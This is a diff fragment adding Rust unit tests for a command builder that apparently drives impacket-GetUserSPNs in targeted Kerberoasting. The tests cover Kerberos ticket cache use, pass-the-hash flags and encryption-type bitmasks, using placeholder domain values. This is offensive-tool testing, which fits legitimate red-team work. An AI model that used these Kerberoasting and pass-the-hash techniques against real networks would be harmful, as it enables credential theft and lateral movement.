+            "ticket_path": "/tmp/ares-tickets/admin.ccache",
+            "etype_hint": ["aes256-cts-hmac-sha1-96"],
+        });
+        let cmd = super::build_targeted_kerberoast(&args).unwrap();
+        let args_vec = cmd.args_for_test();
+        assert!(args_vec.iter().any(|a| a == "-supported-enctypes"));
+        assert!(args_vec.iter().any(|a| a == "-k"));
+        assert!(args_vec.iter().any(|a| a == "-no-pass"));
+        assert!(cmd
+            .env_vars_for_test()
+            .iter()
+            .any(|(k, v)| k == "KRB5CCNAME" && v == "/tmp/ares-tickets/admin.ccache"));
+        // Target string with no password (Kerberos path).
+        assert!(
+            args_vec
+                .iter()
+                .any(|a| a == "contoso.local/admin@192.168.58.10"),
+            "impacket target must be built without password for Kerberos auth; got: {args_vec:?}"
+        );
+    }
+
+    #[test]
+    fn targeted_kerberoast_etype_hash_uses_hashes_flag() {
+        let args = json!({
+            "domain": "contoso.local",
+            "username": "admin",
+            "dc_ip": "192.168.58.10",
+            "target_user": "svc_sql",
+            "hash": "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa",
+            "etype_hint": ["aes256-cts-hmac-sha1-96"],
+        });
+        let cmd = super::build_targeted_kerberoast(&args).unwrap();
+        let args_vec = cmd.args_for_test();
+        assert!(args_vec.iter().any(|a| a == "-supported-enctypes"));
+        // impacket-GetUserSPNs uses `-hashes` (single-dash) for PtH.
+        let idx = args_vec.iter().position(|a| a == "-hashes").unwrap();
+        assert_eq!(
+            args_vec.get(idx + 1).map(String::as_str),
+            Some(":aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"),
+        );
+        assert!(args_vec.iter().any(|a| a == "-no-pass"));
+    }
+
+    #[test]
+    fn targeted_kerberoast_missing_all_auth_errors() {
+        // No etype, no password/hash/ticket → error.
+        let args = json!({
+            "domain": "contoso.local",
+            "username": "admin",
+            "dc_ip": "192.168.58.10",
+            "target_user": "svc_sql",
+        });
+        assert!(super::build_targeted_kerberoast(&args).is_err());
+    }
+
+    #[test]
+    fn etype_hint_bitmask_handles_unknown_etypes() {
+        let args = json!({
+            "etype_hint": ["unknown-cipher", "aes256-cts-hmac-sha1-96"],
+        });
+        let mask = super::etype_hint_bitmask(&args).unwrap();
+        assert_eq!(mask, 0x10, "only the known AES256 bit should be set");
+    }
+
+    #[test]
+    fn etype_hint_bitmask_none_when_array_missing() {
+        let args = json!({"foo": "bar"});
+        assert!(super::etype_hint_bitmask(&args).is_none());
+    }
+
+    #[test]
+    fn etype_hint_bitmask_none_when_all_unknown() {
+        let args = json!({"etype_hint": ["completely-bogus"]});
+        assert!(super::etype_hint_bitmask(&args).is_none());
     }
 }
